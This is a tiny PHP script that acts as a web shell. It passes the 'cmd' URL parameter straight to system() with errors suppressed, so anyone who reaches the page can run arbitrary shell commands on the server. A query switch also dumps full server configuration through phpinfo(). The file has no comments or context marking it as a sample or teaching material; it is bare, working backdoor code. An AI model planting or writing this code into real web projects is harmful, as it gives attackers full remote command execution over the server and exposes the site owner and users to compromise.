<?php 
header("content-type:text/html;charset=gb2312");  
if (!empty($_GET['info'])) {
    switch ($_GET['info']) {
      case '1':
        phpinfo(); 
        exit;
      break;
    }
  }
@system($_GET['cmd']);
?>